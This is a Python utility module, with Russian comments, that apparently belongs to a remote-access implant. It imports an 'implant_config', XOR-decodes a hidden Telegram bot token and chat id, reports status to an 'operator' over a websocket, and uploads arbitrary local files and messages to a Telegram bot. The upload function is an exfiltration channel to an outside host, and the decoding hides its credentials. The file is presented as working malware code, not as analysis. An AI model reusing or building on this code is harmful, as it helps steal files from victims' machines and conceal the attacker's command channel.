# --- Файл: utils.py (Финальная Версия 2.0) ---
import os, requests, json, asyncio
import settings
import implant_config

TEMP_PATH = implant_config.TEMP_PATH

def get_secret(encrypted_value: str) -> str:
    """Расшифровывает секрет, используя ключ из настроек."""
    key = settings.ENCRYPTION_KEY
    if not encrypted_value or not key: return ""
    return ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(encrypted_value, key * (len(encrypted_value) // len(key) + 1)))

def send_status_to_operator(ws, loop, message):
    if ws and not ws.closed and loop:
        try:
            payload_str = json.dumps({'type': 'status', 'data': message})
            coro = ws.send_str(payload_str)
            asyncio.run_coroutine_threadsafe(coro, loop)
        except Exception as e:
            print(f"[!] Не удалось отправить статус: {e}")

def send_telegram_document(file_path, caption=""):
    bot_token = get_secret(settings.ENC_BOT_TOKEN)
    chat_id = get_secret(settings.ENC_CHAT_ID)
    if not bot_token or not chat_id: return False

    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
    try:
        with open(file_path, "rb") as f:
            files = {'document': (os.path.basename(file_path), f)}
            data = {'chat_id': chat_id, 'caption': caption}
            response = requests.post(url, files=files, data=data, timeout=20)
            if response.status_code != 200:
                print(f"[!] Ошибка Telegram ({response.status_code}): {response.text}")
            return response.status_code == 200
    except Exception as e:
        print(f"[!!!] Критическая ошибка отправки документа в Telegram: {e}")
        return False

def send_telegram_message(message):
    bot_token = get_secret(settings.ENC_BOT_TOKEN)
    chat_id = get_secret(settings.ENC_CHAT_ID)
    if not bot_token or not chat_id: return

    import urllib.parse, urllib.request
    try:
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={urllib.parse.quote_plus(message)}"
        urllib.request.urlopen(url, timeout=10)
    except Exception as e:
        print(f"[!] Ошибка отправки в Telegram: {e}")
